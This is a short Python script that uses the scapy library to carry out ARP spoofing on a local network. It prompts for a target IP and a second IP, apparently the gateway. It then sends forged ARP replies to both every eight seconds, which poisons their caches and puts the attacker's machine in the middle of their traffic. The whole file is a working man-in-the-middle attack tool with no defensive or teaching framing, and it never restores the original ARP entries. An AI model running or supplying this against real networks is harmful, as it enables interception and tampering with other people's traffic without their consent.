import scapy.all as scapy
import time
from colorama import Fore
import sys

def get_mac(ip):
    try:

        # make arp packet and seve it in ( arp_packet )
        arp_packet = scapy.ARP(pdst=ip)
        # broadcast packet
        bro_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        # make broadcast packet
        arp_bro_packet = bro_packet/arp_packet
        # save mac for target in ( answr_list )
        answr_list = scapy.srp(arp_bro_packet, timeout=1, verbose=False)[0]
        # return mac
        return answr_list[0][1].hwsrc
    except :
        pass


def spoof(target_ip, spoof_ip):
    # send IP target in ( get_mac ) to get mac address IP
    target_mac = get_mac(target_ip)
    #       make ARP | op = replay | pdst = IP target | hwdst = mac target | psrc = send to IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    # send the packet
    scapy.send(packet, verbose=False)
# IP target
target = str(input('[+] Enter any IP in your network :'))
# IP spoof

spoofs = str(input('Enter IP network :'))

try:
    while True:

        # target to spoof
        spoof(target, spoofs)
        # spoof to target
        spoof(spoofs, target)
        print(f'{Fore.BLUE}[{Fore.GREEN}+{Fore.BLUE}]{Fore.WHITE} Done send Packet ...')
        time.sleep(8)

except :
    pass


